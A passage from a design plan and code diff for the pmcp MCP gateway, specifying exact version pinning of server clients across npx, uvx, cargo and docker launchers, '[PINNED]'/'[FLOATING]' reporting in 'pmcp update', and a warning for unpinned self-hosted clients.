| installer | behaviour of `version:`/`server_version:` |
|---|---|
| npx (`npx`, `npx.cmd`, `npx.exe`) | supported (D3) |
| `npm exec`, `cmd /c npx` wrappers | refused: "install command is not npx" / "pins npx-launched servers only" |
| uvx / pip | refused: `'version'/'server_version' pins npx-launched servers only and this one runs 'uvx'; pin a uvx/pip/cargo/docker server with explicit command and args in .mcp.json or .pmcp.json instead` |
| cargo / docker | refused, same message |
| remote (`url`) | refused: "it is a remote server, so there is no local client to pin" |

The escape hatch already works, because `_detect_effective_version_pin` honours uvx
`pkg==X`, cargo `--version X` and docker `:tag`/`@sha256:` in a configured entry's
explicit args. `update_server`'s new "pinned at X, newer available: Y" report (D6) applies
to those pins too, with one limit: for uvx, `detect_package_type` keeps `pkg==X` as the
"name", so the PyPI lookup fails, and the report reads "latest version could not be
determined". That is honest and not wrong. Proper uvx support means PEP 440 grammar plus
`--from` slot handling, and is left to a follow-up if anyone asks.

### D6. How `pmcp update` reports

**`gateway.update_server` (the pinned branch, `handlers.py:5411-5428`).** The existing
refusal stays: `ok=False`, no probe, no restart, and the substring
`is pinned to 'V' in <source>` that `tests/test_pkgid_panel_fixes.py:900` asserts. The
change adds a **registry read**. `get_package_version(command, args, env, cwd,
timeout=5.0)` strips the pin and returns `dist-tags.latest`. Then
`compare_versions(pinned, latest, package_type)` classifies it three ways, never
negated (#164). Three new output fields are set:
`pinned_version`, `latest_available`, and `latest_comparison ∈ {"newer","not_newer","incomparable"} | None`
(`None` = the lookup failed). The message gains one sentence:
`Pinned at 3.25.5, newer available: 3.26.0.` / `Pinned at 3.25.5, up to date.` /
`...; the latest (X) cannot be ordered against it.` / `...; the latest version could not be determined.`

**`pmcp update` (the CLI renderer).** The per-result print moves into a pure
`_format_update_result(item) -> list[str]`. A result with `pinned_version` renders as
`[PINNED] firecrawl: pinned at 3.25.5, newer available: 3.26.0` (or `up to date` /
`latest X cannot be compared` / `latest unknown`) instead of `[FAILED] firecrawl: <long
refusal>`. Other results render exactly as today. Every string in `warnings` prints under
its result as `  warning: <text>`. `--json` gets the new fields for free. The exit code is
unchanged (0), because `run_update` has never exited nonzero on a per-server result.

**Revision 2 (codex P2 / claude F1): a range or tag is FLOATING, not PINNED.**
`_detect_effective_version_pin` answers "does the argv carry any version selector". That
is the right question for the refusal: do not move what the operator chose, and the
refusal is unchanged. It is the wrong question for the label. `_is_exact_pin` decides
the label. An exact pin reports as above. A range or dist-tag (`^3.25.0`, `~3.25.5`,
`next`) returns `floating_selector="^3.25.0"`, `pinned_version=None` and
`latest_comparison=None`, with a message that starts `'fc' is held at '^3.25.0' in ...`
and says `'^3.25.0' is a range or tag, not one exact version: it re-resolves at every
spawn, so it does not hold the client still (latest: 3.26.0).` `pmcp update` prints
`[FLOATING] fc: held at ^3.25.0, a range or tag that re-resolves at every spawn (latest 3.26.0)`
(wording replaced in revision 6, NB-2: see the rev-6 table below). `[FLOATING]` is not a failure, and the exit code stays 0.

**Revision 3 (board round 2, N3): build metadata in a configured argv.** npm and cargo
ignore `+...` when resolving, so for an exact pin the label is **what runs**:
`firecrawl-mcp@3.25.5+evil` reports `pinned_version="3.25.5"`, compares `3.25.5` with
latest, and says `(build metadata '+evil' is ignored by npm)`. A manifest `version:`
with `+` is still refused at load.

**Revision 6 (board round 4, C2/NB-2): "exact" is decided per launcher.** `_is_exact_pin`
dispatches on the package type **before** any rule, and shares no rule across launchers. An
unhandled type is never exact. The same predicate drives the warning, `pinned_version` /
`floating_selector`, and `[PINNED]` / `[FLOATING]`.

| launcher | the pin `_detect_effective_version_pin` returns | exact when | floating text (`_floating_reason`) |
|---|---|---|---|
| npm (`npx`, `npm exec`) | the spec's selector | `is_valid_package_version`: one registry version, never a range, a dist-tag or a tarball-shaped string. `+build` stays exact, because npm runs the version it decorates (D6, N3). | `not one exact version on every npm release` (npa 12 and 13 read `1.0.0-x.tar-gz` differently, so the text claims only what holds on both) |
| docker (`docker run`) | the `@digest` if present, else the `:tag` | a content digest only: `sha256:` + 64 lowercase hex (or `sha384:`/96, `sha512:`/128, the OCI-registered algorithms). **Every tag floats, however version-like**, because a registry can re-point it. | `a docker tag, which can be moved to another image; only an @sha256 digest pins one`; the remedy names `image@sha256:...` |
| pypi (`uvx pkg==X`) | the text after `==` | one PEP 440 version (`_parse_version`) with no `*`. `===X` arrives as `=X`, which is not a version, so it floats. | `not one exact PEP 440 version` |
| cargo (`cargo install --version X`) | X | `is_valid_package_version`. cargo installs exactly X only when X has no operator; `=1.2.3` is a requirement to cargo, so it floats here (conservative: a warning, never silence). | `cargo reads it as a version requirement, not one exact version` |
| anything else | n/a | never | n/a |

`update_server`'s floating message now reads `'X' does not hold the client at one version
(<floating text>): a later spawn can run another one (latest: Y).`, and `pmcp update`
prints `[FLOATING] fc: held at ^3.25.0, which is not one exact version and can resolve to
another at a later spawn (latest 3.26.0)`. Revision 5 checked `is_valid_package_version`
first for every type. That made a docker tag `3.25.5` exact (C2), and also pypi
`1.0.0-x.tgzx` (not PEP 440) and an unknown type's `3.25.5`.

### D7. The unpinned-self-hosted warning (proposal 2)

`_unpinned_self_hosted_warning(server_name, manifest_server, resolved)` in `handlers.py`
is a pure function. It fires only when **both** of these hold:

1. **The relaxer is active on the child env.** That is
   `credential_requirement(manifest_server, child_env=resolved.config.env).relaxed_by`.
   For a manifest-only server, `resolved` is `manifest_server_to_config(...)`, whose env
   carries `extra_env` (including `server_env` patches). For a configured entry it is
   the merged config, so an entry that blanks `FIRECRAWL_API_URL` is judged on the blank
   value.
2. **The spawning argv is unpinned** by the *same* `_detect_effective_version_pin` that
   `update_server` uses, so the two can never disagree. `@latest` counts as unpinned.

It judges the **effective** config (configured over manifest), so the
ViperJuice/dotfiles#325 shape (`.pmcp.json` with explicit `firecrawl-mcp@3.25.5`) does
**not** warn, and `~/.pmcp.json`'s current `firecrawl-mcp@latest` **does**. The remedy
text depends on the source. A manifest-sourced npm entry is told
`pin it with \`server_version: {firecrawl: <version>}\` in ~/.pmcp/manifest.yaml`. Anything
else is told to pin it in the args of the config that launches it.

**Revision 2 changes to the predicate:**

- **Exactness (codex P2 / claude F1).** The argv counts as pinned only if
  `_is_exact_pin(package_type, pin)`: `is_valid_package_version(pin)` in every
  ecosystem, a docker `sha256:` digest (immutable), or a PyPI `==X` with no wildcard.
  A bare spec, `@latest`, a range or another dist-tag all warn. A non-exact selector is
  named in the text: `floats on '^3.25.5' (a range or tag, not one exact version)`.
  (Revision 6: exactness is decided per launcher, so a docker tag floats (C2), and the
  text names each launcher's reason (NB-2). See the D6 rev-6 table.)
- **Inherited environment (claude F2).** The relaxer is judged on
  `sanitized_subprocess_env(resolved.config.env, project_root)`, which is exactly what
  `client/manager.py:2409` spawns the child with. So a `FIRECRAWL_API_URL` exported in the
  shell that started pmcp counts. This is advisory only: every credential **gate** keeps
  `child_env=config.env` and is not touched (for a gate, ignoring the ambient value is
  the safe direction, #124), and `tests/test_credential_predicate_guard.py` stays green.
- **Health cost (claude F3).** Health judges the config the gateway **connected** with
  (`ClientManager.get_connected_configs()`, an existing public method), so there is no
  config-file I/O. The relaxer-declaring manifest entries are cached per `GatewayTools`
  and keyed by `manifest_sources_fingerprint()` (`stat` only), so the manifest is
  re-loaded only when a source or the trust store changes. A server that is not
  connected is not judged by health; `update_server` still judges it, on a fresh
  resolution.

**Revision 3 change (board round 2, N2): npm identity disabled.** When
`detect_package_type` refuses an **npx** launch (identity disabled or refused, #195),
the warning does not go silent. It reads the slot with `provision_gate._package_slot`
and `split_plain_registry_spec`, the grammar the materialiser uses. An exact pin is
silent. `@latest`, a bare spec, a range or a tag warns, with `(read from the argv: npm
package identity is unavailable)`. A slot the grammar can't name at all warns
`pmcp cannot verify that its client is pinned ... (see gateway_diagnostics.npm_identity)`.
Any other command with unknown identity stays silent, as before.

**Revision 4 (board round 3, N-b/N-d).** The whole npm family fails loud: an `npm` launcher (for example `npm exec ...`) has no structural slot pmcp reads, so it warns `cannot verify ... pmcp reads only an npx argv structurally, and this one launches with npm`. Every fallback message names the **actual** cause, via `_npm_identity_refusal_cause()` (`status_summary()`, which never spawns). `active` gives `npm's own parser did not identify a registry package in this argv`. Anything else gives `npm package identity is unavailable (gateway_diagnostics.npm_identity: <status>)`.

**Revision 6 (board round 4, C1/NB-1): an exact argv is a pin only when nothing else can
redirect it.** For npm, `_is_exact_pin` on the argv's selector is now **necessary, not
sufficient**. Before suppressing, the warning asks `_npm_redirecting_context(command,
package, config.env, config.cwd, child_env)` whether anything besides the argv can change
what npm runs for that spec. It asks in **both identity modes**, and it computes the answer
itself from the inputs it holds, never from the resolver's refusal reason or status. The
same context gave three different status strings depending on whether an earlier lookup
had started the child. The sticky DISABLED reason also names only the first key it saw.

The sources and the key allowlist are derived in Research (*What can change what a
registry spec runs*). If any source can redirect, the warning names it and says it cannot
verify the pin:

`'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp cannot verify
that its client is pinned: the argv pins fc-mcp@3.25.5, but npm_config_package is set in
the client's environment, which can change what npm runs for that spec. Remove it, or
launch the client where it does not apply, to hold the client at the pinned version.`

dev0's `npm_config_cache` and `npm_config_store_dir` are on the allowlist, so the
structural read of revision 3 (N2) still keeps an exact pin silent there. That read was
the reason for N2. An unpinned or floating argv warns as before; the context check runs
only when the warning would otherwise go silent. The check applies to the npm family
only. For uvx/pip and cargo, pmcp does not read the package index configuration (see R8).

The **cause** in a fallback message is keyed on the launcher first (NB-1). For a command
identity does not read (`npx.cmd`, `/usr/bin/npx`, `C:\tools\npx.cmd`, `npm.cmd`), it is
`pmcp's npm identity check reads only a bare \`npx\`/\`npm\` command, and this one is
'npx.cmd'`. The resolver was never asked, so its status says nothing about this argv.
For such a launcher, the context check is the only context gate. That is one more reason
it must not depend on the resolver.

**Revision 7 (board round 5, maintainer decision): the entry-controlled boundary.** The
revision-6 paragraph above is superseded where it reads host state. The suppression rule
is now: the argv's selector is exact for its launcher (`_argv_pin_is_exact`, which adds
the PEP 508 check for uvx), **and** `_entry_redirect(package_type, command, args, package,
config.env)` is `None`. That function judges only what the entry controls:

- **the entry's env block** (`config.env`, including an overlay's `server_env`), per
  launcher family, with small allowlists (Revision 7 table);
- **a `cwd` the entry sets**, for npm/npx, uvx and cargo, whose resolution reads
  cwd-relative project configuration. docker is exempt. An inherited cwd (none set) is
  the host's;
- **argv flags** for uvx (up to the command) and cargo (anywhere), with small allowlists.
  npm's argv is read by the structural slot rule, and a docker digest is
  content-addressed;
- **the launcher**: a launcher whose argv pmcp reads (npm family, `uvx`, `pip`, `pip3`,
  `cargo`, `docker`) with an argv it cannot read fails loud (`cannot read which package
  this ... argv runs`).

Anything the host provides (its environment, npmrc/uv/cargo/docker configuration files,
shims, caches, global bins, proxy/CA settings) is trusted and not read. The warning for a
redirect reads: `'fc' talks to a self-hosted backend (SELFHOST_API_URL is set), but pmcp
cannot verify that its client is pinned: the argv pins npm:fc-mcp at 3.25.5, but the
entry's env sets npm_config_package, which can change what runs for that pin. Remove it
from the entry to hold the top-level package at the pinned version.` The same rule applies
to every launcher, so uvx and cargo pins are judged too (B2).

**Revision 8 (board round 6): allowlists.** The revision-7 paragraph above keeps its
boundary (the entry's argv, env, cwd and launcher; the host is trusted), but both of its
rules become allowlists. `_entry_redirect(package_type, command, args, package, pin, env,
cwd, declared)` returns `None` only when:

- `_argv_shape_problem` recognises the argv as a shape in which the pinned package runs
  (the Revision 8 table);
- every key of the entry's env block is `_entry_env_key_is_inert` (the server's declared
  keys outside tool namespaces, locale/terminal keys, and the per-launcher
  logging/timing/credential lists), with no value special-cased;
- no cwd is set that the launcher reads configuration from.

The unknown-identity branch makes unmodelled runners and wrappers loud, and `uv tool run`
is rewritten to uvx before detection. `update_server` applies the same shape check before
it labels a pin `[PINNED]`. **What a docker digest pins:** the image, not the command,
entrypoint, mounts or env that decide what runs in it. So the docker shape forbids all of
them, except `-e` with an inert key.

**Revision 9 (board round 7).** Two changes to the revision-8 rule above. (a) For a
manifest-sourced server, `_install_argv_problem` judges every non-empty `install[platform]`
argv by the same rules and requires the same package and pin (the
`_config_runs_exactly` rule), because `gateway.provision` spawns and adopts that process.
The same check gates `[PINNED]`. (b) `declared` comes from `_declared_env_keys(server_name)`,
the **shipped** manifest's declarations for that name, never from the entry, an overlay or
a config file. The namespace guard is removed.

The warning appears in two places:

- **`gateway.health`.** `ServerHealthInfo.warnings: list[str]` (default `[]`) is filled by
  `_attach_version_pin_warnings(servers)` just before diagnostics. The cost, **as of
  revision 2 and measured** (21 calls, an unapproved project overlay present): one
  `load_manifest()` per change of `manifest_sources_fingerprint()`, not per call, and
  then per connected relaxer-declaring server one `sanitized_subprocess_env` plus one
  resolver query. That is 174 ms on the first call and 1.3 ms steady, with 1 WARNING
  line in total. Revision 1 measured 220.7 ms steady and 42 WARNING lines. It is
  wrapped in `try/except`, logged at DEBUG, and never costs health its answer.
- **`gateway.update_server`.** The public method becomes a thin wrapper around the
  unchanged body (renamed `_update_server_unwarned`). It appends the warning computed on
  the configuration **after** the attempt. The warning never changes `ok` and never
  blocks the update. An unpinned self-hosted client is still updated, and still warned
  about, because it is still unpinned. `pmcp update` prints it under the result (D6).

## Changes

### `src/pmcp/manifest/loader.py` (modify)

| entity | action | reason |
|---|---|---|
| imports | add `from pmcp.validation import is_valid_package_version, parse_package_spec` | D1 grammar, D3 slot parse (validation imports nothing from pmcp, so there is no cycle; measured by mypy + the suite) |
| `ServerConfig.version: str \| None = None` | add, with a 5-line comment | the pin, `None` = unpinned, including a refused pin |
| `_parse_version_pin(name, raw, field_label)` | add | D1, fail-soft WARNING that names the field (`version` / `server_version`) |
| `_pin_npx_args(args, version)` | add | D3 step 3. Local import of `provision_gate._NPX_LEADING_FLAGS` (provision_gate imports `ServerConfig` under `TYPE_CHECKING` only, but a local import keeps the module graph as it is) |
| `_materialize_version_pin(server)` | add | D3 steps 1-5, all or nothing |
| `split_plain_registry_spec(arg)` + `_NPM_FILE_TYPE_RE` (an alias of main's `validation.NPM_FILE_TYPE_RE`, imported, never restated), `_NPM_EXCLUDED_NAMES`, `_TAG_WORD_RE`, `_PARTIAL_VERSION_WORD_RE` (rev 3; rev 4 re-orders the selector file check before the version branch, adds the exclusion names, and widens the range word to `[vV=]*`) | add; `_pin_npx_args` calls it for the slot | D3 class table: codex P1, board rounds 2-3 (B1, B1', N4, N-a, N-c) |
| `_materialize_version_pin_soft(server)` (rev 2) | add; the load pass calls it | D3 step 6, codex P3 |
| `manifest_sources_fingerprint()` (rev 2) | add, public, `stat` only | D7 health cache, claude F3 |
| `_parse_version_pin` (rev 2) | also refuse `+` build metadata | D1, claude N2 |
| `_parse_server_config` | add `version=_parse_version_pin(name, data.get("version"), "version")` | D2 `version:` key |
| `_OverlayDocument` | widen to a 4-tuple `(servers, clis, server_env, server_version)` | D2. The only callers are `_load_overlay_file` and `load_manifest` (grep: no test imports it) |
| `_load_overlay_file`, `_parse_overlay_document` | return 4-tuples; parse `server_version:` (a mapping of non-empty str → `_parse_version_pin`; a non-mapping gets a WARNING); docstring paragraph | D2 |
| `load_manifest` | unpack 4-tuples in both branches; include the server_version count in the "Applying manifest overlay" INFO line; apply `server_version` per source after `server_env` (unknown name → WARNING, skip); **after the overlay loop, outside `if apply_overlays`**, the materialisation pass | D2/D3 |

### `src/pmcp/types.py` (modify)

| entity | action | reason |
|---|---|---|
| `ServerHealthInfo.warnings: list[str] = Field(default_factory=list)` | add | D7. The same `default_factory` shape as `missing_env_vars` |
| `UpdateServerOutput.pinned_version`, `.latest_available: str \| None = None`, `.latest_comparison: Literal["newer","not_newer","incomparable"] \| None = None`, `.warnings: list[str]` | add | D6/D7 |
| `UpdateServerOutput.floating_selector: str \| None = None` (rev 2) | add | D6 FLOATING, codex P2 |

### `src/pmcp/tools/handlers.py` (modify)

| entity | action | reason |
|---|---|---|
| imports | add `compare_versions` (version_checker) and `credential_requirement` (manifest.loader) | D6/D7 |
| `_unpinned_self_hosted_warning(server_name, manifest_server, resolved, project_root)` (module level, after `_detect_effective_version_pin`) | add | D7 (rev 2: judges the relaxer on `sanitized_subprocess_env`, and suppresses only on `_is_exact_pin`) |
| `_is_exact_pin(package_type, pin)` (rev 2) | add | D6/D7, codex P2 |
| identity-disabled fallback in `_unpinned_self_hosted_warning` (rev 3; rev 4) | add: the npm family by `normalized_executable_name`; npx is read via `provision_gate._package_slot` + `split_plain_registry_spec`, and `npm` fails loud (imports added) | D7, board round 2 N2, round 3 N-b |
| `_npm_identity_refusal_cause()` (rev 4) | add | D7, round 3 N-d |
| pinned branch: `build_note` (rev 3) | add: strip `+...` from an exact npm/cargo pin before comparing and labelling | D6, board round 2 N3 |
| imports (rev 2) | add `_parse_version` (version_checker) and `manifest_sources_fingerprint` (manifest.loader) | `_is_exact_pin`, the health cache |
| `GatewayTools._relaxable_cache`, `_relaxable_manifest_servers()` (rev 2) | add | D7 health cache, claude F3 |
| `health` | call `self._attach_version_pin_warnings(servers)` before the diagnostics block | D7 |
| `_version_pin_warning(server_name)`, `_attach_version_pin_warnings(servers)` (methods, before `_config_source_paths_by_server`) | add | D7. Rev 2: health judges `get_connected_configs()`, not `load_configs()` |
| `update_server` | becomes a wrapper that **keeps the full contract docstring** (plus one #294 paragraph) **and validates with `UpdateServerInput.model_validate` itself** (rev 5, required by #300's handler-validates test); the body moves to `_update_server_unwarned(parsed: UpdateServerInput)` with a one-line pointer docstring and is otherwise unchanged except for the pinned branch | D7. `tests/test_tools.py::test_update_server_docstring_states_both_probe_window_env_contracts` reads `GatewayTools.update_server.__doc__` (measured: moving the docstring turns it red) |
| pinned branch of the body (`if pinned_to is not None:`) | add the registry read + `compare_versions`, set the three fields, and add the availability sentence to the message. Rev 2: `exact = _is_exact_pin(...)`; a non-exact selector sets `floating_selector`, and the message says `is held at` | D6 |
| `_is_exact_pin(package_type, pin)` (rev 6) | **rewrite** as a per-launcher dispatch with no shared rule, plus the module regex `_DOCKER_DIGEST_RE`: npm and cargo `is_valid_package_version`, docker a content digest only, pypi PEP 440 without `*`, anything else `False` | D6 rev-6 table, board round 4 C2 |
| `_floating_reason(package_type)` (rev 6) | add; used by the health warning's `floats on` text and by `update_server`'s floating sentence | D6, round 4 NB-2 |
| `_NPM_KEYS_THAT_CANNOT_REDIRECT`, `_npm_env_config_key`, `_npm_key_can_redirect`, `_npmrc_redirecting_key`, `_npm_config_files`, `_npm_redirecting_context` (rev 6) | add (module level, before `_npm_identity_refusal_cause`). A local import of `npm_resolver._gate_relevant_env` and `_has_local_prefix` (identity's own definitions, reused) | Research *What can change what a registry spec runs*, D7, round 4 C1 |
| `_npm_identity_refusal_cause(command)` (rev 6) | takes the command; a non-bare launcher names itself before the resolver is consulted | D7, round 4 NB-1 |
| `_unpinned_self_hosted_warning` exact branch (rev 6) | an exact npm pin is silent only when `_npm_redirecting_context(...)` is `None`, else "cannot verify ... <source>"; the docker remedy names a digest; the `floats on` text uses `_floating_reason` | D7, round 4 C1/C2/NB-2 |
| pinned branch of the body: the floating sentence (rev 6) | `'X' does not hold the client at one version (<reason>): a later spawn can run another one (latest: Y).` | D6, round 4 NB-2 |
| rev-6 npm host discovery (`_NPM_KEYS_THAT_CANNOT_REDIRECT`, `_npmrc_redirecting_key`, `_npm_config_files`, `_npm_redirecting_context`) (rev 7) | **remove** | Revision 7, trust boundary (round 5 B1) |
| `_ENTRY_ENV_REDIRECTING_KEYS`, `_ENTRY_ENV_FAMILY_KEYS`, `_NPM_ENTRY_KEYS_THAT_CANNOT_REDIRECT`, `_UV_ENTRY_KEYS_THAT_CANNOT_REDIRECT`, `_CARGO_ENTRY_KEYS_THAT_CANNOT_REDIRECT`, the uv/cargo credential regexes, `_entry_env_key_can_redirect`, `_UVX_FLAGS_THAT_CANNOT_REDIRECT`, `_CARGO_FLAGS_THAT_CANNOT_REDIRECT`, `_argv_redirecting_flag`, `_entry_redirect` (rev 7) | add; `_npm_env_config_key` and `_npm_key_can_redirect` (now against the 17-key entry allowlist) are kept | Revision 7 table, D7 rev 7 (C1 within the entry, B2, N1, N3, N4) |
| `_uvx_requirement_is_exact(args)`, `_argv_pin_is_exact(package_type, pin, command, args)` (rev 7) | add; used by the warning and by `update_server`'s `exact` | N5 (a URL requirement is never exact) |
| `_DOCKER_DIGEST_LIKE_RE`; `_floating_reason(package_type, pin="")` (rev 7) | add; a malformed digest gets its own label | N5 |
| `_READ_LAUNCHERS` and the unreadable-argv branch of `_unpinned_self_hosted_warning` (rev 7) | add | N5 (docker/uvx match the npm family's fail-loud) |
| `_entry_redirect(..., cwd=None)` and `_CWD_CONFIG_FAMILIES` (rev 7, cwd ruling) | an entry-set `cwd` is "cannot verify" for npm/uv/cargo; the warning passes `config.cwd` | Revision 7 table, **cwd** row |
| rev-7 denylists (`_ENTRY_ENV_REDIRECTING_KEYS`, `_ENTRY_ENV_FAMILY_KEYS`, `_entry_env_key_can_redirect`, `_UVX_FLAGS_THAT_CANNOT_REDIRECT`, `_CARGO_FLAGS_THAT_CANNOT_REDIRECT`, `_argv_redirecting_flag`) (rev 8) | **remove** | Revision 8, round 6 root cause |
| `_ENTRY_ENV_INERT_KEYS`/`_PREFIXES`, `_TOOL_ENV_PREFIXES`/`_NAMES`, `_in_tool_namespace`, `_declared_env_keys`, `_entry_env_key_is_inert` (rev 8) | add: the env allowlist | Revision 8 (1): X2, N1, N4 |
| `_NPX_INERT_FLAGS`, `_UVX_INERT_*`, `_CARGO_INERT_*`, `_DOCKER_INERT_*`, `_split_flag`, `_npx_shape_problem`, `_uvx_shape_problem`, `_cargo_shape_problem`, `_docker_shape_problem`, `_argv_shape_problem` (rev 8) | add: the argv shape allowlist | Revision 8 (2): X1, N3 |
| `_entry_redirect(package_type, command, args, package, pin, config_env, cwd, declared)` (rev 8) | shape first, then every env key against the allowlist, then cwd | Revision 8 |
| `_UNMODELLED_RUNNERS`; the `uv tool run` rewrite in `_unpinned_self_hosted_warning` (rev 8) | add | Revision 8 (3): N2 |
| `update_server` pinned branch: `shape_problem` (rev 8) | an exact selector in an unrecognised shape is `floating_selector`, and the reason is the shape problem | Revision 8: X1 in the report |
| `_TOOL_ENV_PREFIXES`, `_TOOL_ENV_NAMES`, `_in_tool_namespace`; `_declared_env_keys(server)` (rev 9) | **remove**; `_declared_env_keys(server_name)` reads `_shipped_manifest_declarations()` (the packaged `manifest.yaml`, `lru_cache`d) | Revision 9 (2): B2 |
| `_read_spawn_pin`, `_install_argv_problem` (rev 9) | add; called by the warning and by `update_server` for a manifest-sourced server | Revision 9 (1): B1 |
| `_NPX_INERT_FLAGS` gains `--yes=true`; the docker shape accepts combined inert short flags (`-it`) (rev 9) | modify | Revision 9 (3): N2 |

### `src/pmcp/cli.py` (modify)

| entity | action | reason |
|---|---|---|
| `run_update` print loop | `for line in _format_update_result(item): print(line)` | D6 |
| `_format_update_result(item)` (after `run_update`) | add | D6. Pure, so it is unit-tested without a gateway. Rev 2: the `[FLOATING]` branch |

### `tests/test_pkgid_panel_fixes.py` (modify): keep the pinned-refusal test offline

| entity | action | reason |
|---|---|---|
| `test_update_server_still_refuses_a_pinned_manifest_server_as_before` | add a `monkeypatch.setattr(handlers_module, "get_package_version", no_registry)` stub returning `(None, "npm")` before the call | The pinned branch now makes a **registry read** (D6). Without the stub, this pre-existing test makes a real HTTP request to registry.npmjs.org for `@shipped/server`. That can take up to the 5 s timeout, and it is swallowed to `None`, so it would never go red: a silent hermeticity regression (the Consiliency/pmcp#235 class). The refusal path was offline before this diff and must stay offline. |

**Measured** with a no-network plugin (Verification step 5b) over every test file that
drives `update_server` or `health` (19 files):

- HEAD: 0 registry lookups.
- The spike without this stub: exactly **1** offender, this test (`1 failed, 857 passed`).
- The spike with the stub: 0. Revision 2 re-measured this over the same 19 files: `878 passed, 1 deselected`; revision 3: `910 passed, 1 deselected`.

The pinned-refusal tests in `tests/test_tools.py` (`test_update_server_refuses_pinned_configured_override`,
`..._pinned_docker_tag`) already stub `get_package_version` and need no change. The stub
is included in the production diff above.

### `tests/test_version_pin.py` (create)

153 tests (rev 6; 112 in rev 5, 107 in rev 4, 89 in rev 3, 57 in rev 2, 37 in rev 1). Rev 6 adds 41 cases for board round 4: C1 (27: 6 redirecting environment keys, 2 overlay keys and 5 npmrc/local-prefix sources, each in both identity modes, plus the key-classification unit test), the C1 control (2), C2 (3), NB-1 (8) and NB-2 (1). It also adds an autouse fixture that removes ambient `npm_config_*`/`NODE_OPTIONS`, so a host's own npm configuration cannot decide a test, and it updates the expected floating text in two existing tests. Rev 5 adds main's two stricter rules as fixed cases: 2 pin values and 3 slot ids. Rev 4 adds 4 tarball-shaped pin values, 11 generated-class slot ids (SemVer tarballs, `vv` ranges and versions, excluded names), the tarball predicate/gate test, and the two health tests for tarballs and `npm exec`. The parametrized sets are: 17 version refusals, **25 npa-class non-plain slots**, 8 accepted-class controls, 3 malformed shapes and 4 floating specs. It also has 2 fingerprint tests, 3 identity-disabled tests and 1 build-metadata label test. Body verbatim below.

### Production diff (spike, verbatim; apply as-is)

The diff is against `959d4d4` (rev 5; earlier revisions were against `9ca081e`), already `ruff format`-clean.

```diff
diff --git a/src/pmcp/cli.py b/src/pmcp/cli.py
index 74ced0d..f3625d8 100644
--- a/src/pmcp/cli.py
+++ b/src/pmcp/cli.py
@@ -1005,15 +1005,52 @@ async def run_update(args: argparse.Namespace) -> None:
             return
 
         for item in results:
-            ok = bool(item.get("ok"))
-            status = "OK" if ok else "FAILED"
-            server = item.get("server", "unknown")
-            message = item.get("message", "")
-            print(f"[{status}] {server}: {message}")
+            for line in _format_update_result(item):
+                print(line)
     finally:
         await client_manager.disconnect_all()
 
 
+def _format_update_result(item: dict[str, object]) -> list[str]:
+    """Render one gateway.update_server result for `pmcp update`.
+
+    A pinned server was deliberately not moved, so it is ``[PINNED]`` with
+    its availability line, not ``[FAILED]`` (Consiliency/pmcp#294). A server
+    held at a range, a dist-tag or a docker tag was not moved either, but it
+    is not pinned -- it can resolve to another artifact at a later spawn -- so
+    it is ``[FLOATING]`` (#295 board).
+    Warnings are advisory and printed under the result whatever its status.
+    """
+    server = item.get("server", "unknown")
+    pinned = item.get("pinned_version")
+    floating = item.get("floating_selector")
+    if floating:
+        latest = item.get("latest_available") or "unknown"
+        lines = [
+            f"[FLOATING] {server}: held at {floating}, which is not one exact "
+            f"version and can resolve to another at a later spawn (latest {latest})"
+        ]
+    elif pinned:
+        latest = item.get("latest_available")
+        comparison = item.get("latest_comparison")
+        if comparison == "newer":
+            detail = f"pinned at {pinned}, newer available: {latest}"
+        elif comparison == "not_newer":
+            detail = f"pinned at {pinned}, up to date"
+        elif comparison == "incomparable":
+            detail = f"pinned at {pinned}, latest {latest} cannot be compared"
+        else:
+            detail = f"pinned at {pinned}, latest unknown"
+        lines = [f"[PINNED] {server}: {detail}"]
+    else:
+        status = "OK" if bool(item.get("ok")) else "FAILED"
+        lines = [f"[{status}] {server}: {item.get('message', '')}"]
+    warnings = item.get("warnings")
+    if isinstance(warnings, list):
+        lines.extend(f"  warning: {warning}" for warning in warnings)
+    return lines
+
+
 def _get_gateway_url() -> str:
     """Return the PMCP gateway MCP endpoint URL."""
     return os.environ.get(
diff --git a/src/pmcp/manifest/loader.py b/src/pmcp/manifest/loader.py
index 9837e82..016e0bb 100644
--- a/src/pmcp/manifest/loader.py
+++ b/src/pmcp/manifest/loader.py
@@ -14,6 +14,11 @@ from typing import Any, Literal, cast
 import yaml
 
 from pmcp.project_consent import log_refusal, read_and_gate
+from pmcp.validation import (
+    NPM_FILE_TYPE_RE,
+    is_valid_package_version,
+    parse_package_spec,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -88,6 +93,12 @@ class ServerConfig:
     status: str | None = None
     source: str | None = None
     replacement: str | None = None
+    # The exact client version this entry runs (Consiliency/pmcp#294). Set by
+    # `version:` on an entry or by an overlay's `server_version:` patch, and
+    # materialised by `load_manifest` into the npx package slot of `args` and
+    # of every `install` argv. ``None`` means unpinned -- including a pin that
+    # was refused, so "version is set" always means "the argv is pinned".
+    version: str | None = None
 
 
 def credential_storage_key(server: Any) -> str | None:
@@ -553,6 +564,246 @@ def _parse_api_key_optional_when(
     return parsed
 
 
+def _parse_version_pin(name: str, raw: Any, field_label: str) -> str | None:
+    """Parse a client version pin, fail-soft and fail-closed.
+
+    One exact SemVer version (``is_valid_package_version``, the grammar the
+    provision gate already requires of an argv pin) or nothing. Refused, with
+    a warning: a range (``^3.25.5``, ``3.x``) and a dist-tag (``latest``) --
+    both re-resolve at every ``npx -y`` spawn, which is the drift a pin exists
+    to stop -- a ``v`` prefix, a YAML number, and anything carrying a package
+    name, whitespace or a flag. The value never names a package: the name is
+    always taken from the entry's own argv (see `_materialize_version_pin`).
+    """
+    if raw is None:
+        return None
+    # SemVer build metadata (the `+...` segment) is refused too: npm ignores it
+    # when resolving, so `3.25.5+x` would run 3.25.5 while every report echoed
+    # a label that names nothing (Consiliency/pmcp#295 board, N2).
+    if isinstance(raw, str) and is_valid_package_version(raw) and "+" not in raw:
+        return raw
+    logger.warning(
+        f"Ignoring '{field_label}' {raw!r} for server '{name}': a version pin "
+        'must be one exact version such as "3.25.5" -- not a range, a '
+        'dist-tag such as "latest", build metadata (+...), a name npm '
+        "reads as a local tarball (.tgz/.tar/.tar.gz), or a package "
+        "spec; the server stays unpinned"
+    )
+    return None
+
+
+# npm-package-arg's classification, restated as the ALLOWLIST a pin may
+# rewrite (Consiliency/pmcp#295 board rounds 1-2). npa decides a spec's class
+# in a fixed order, and only its final branch, `fromRegistry`, fetches `name`
+# from the registry; every earlier branch (URL, git, alias, file, directory,
+# hosted git) names something else. The plan's class table maps each branch to
+# the clause below that refuses it.
+#
